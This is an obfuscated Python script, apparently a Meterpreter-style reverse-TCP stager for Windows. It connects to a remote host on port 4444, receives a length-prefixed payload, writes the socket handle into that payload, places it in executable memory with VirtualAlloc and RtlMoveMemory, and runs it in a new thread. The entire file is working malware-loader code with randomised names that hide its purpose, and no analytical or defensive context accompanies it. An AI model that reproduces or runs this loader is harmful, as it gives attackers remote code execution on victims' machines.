import struct, socket, binascii, ctypes as qPRTqe, random, time
aNyfbAChYk, naiChhJvPFpUie = None, None
def EPpuiMJnRVcFQEd():
	try:
		global naiChhJvPFpUie
		naiChhJvPFpUie = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		naiChhJvPFpUie.connect(('8.8.8.8', 4444))
		Resbnmsoz = struct.pack('<i', naiChhJvPFpUie.fileno())
		l = struct.unpack('<i', naiChhJvPFpUie.recv(4))[0]
		aorvgf = b"     "
		while len(aorvgf) < l: aorvgf += naiChhJvPFpUie.recv(l)
		cSlQhzbQrtodAgs = qPRTqe.create_string_buffer(aorvgf, len(aorvgf))
		cSlQhzbQrtodAgs[0] = binascii.unhexlify('BF')
		for i in range(4): cSlQhzbQrtodAgs[i+1] = Resbnmsoz[i]
		return cSlQhzbQrtodAgs
	except: return None
def aUPZfbuSJVvM(lryHhOR):
	if lryHhOR != None:
		NmLsKCEbyZ = bytearray(lryHhOR)
		qHqVPimRyq = qPRTqe.windll.kernel32.VirtualAlloc(qPRTqe.c_int(0),qPRTqe.c_int(len(NmLsKCEbyZ)),qPRTqe.c_int(0x3000),qPRTqe.c_int(0x40))
		iAPjDIYrGhoe = (qPRTqe.c_char * len(NmLsKCEbyZ)).from_buffer(NmLsKCEbyZ)
		qPRTqe.windll.kernel32.RtlMoveMemory(qPRTqe.c_int(qHqVPimRyq), iAPjDIYrGhoe, qPRTqe.c_int(len(NmLsKCEbyZ)))
		ht = qPRTqe.windll.kernel32.CreateThread(qPRTqe.c_int(0),qPRTqe.c_int(0),qPRTqe.c_int(qHqVPimRyq),qPRTqe.c_int(0),qPRTqe.c_int(0),qPRTqe.pointer(qPRTqe.c_int(0)))
		qPRTqe.windll.kernel32.WaitForSingleObject(qPRTqe.c_int(ht),qPRTqe.c_int(-1))
aNyfbAChYk = EPpuiMJnRVcFQEd()
aUPZfbuSJVvM(aNyfbAChYk)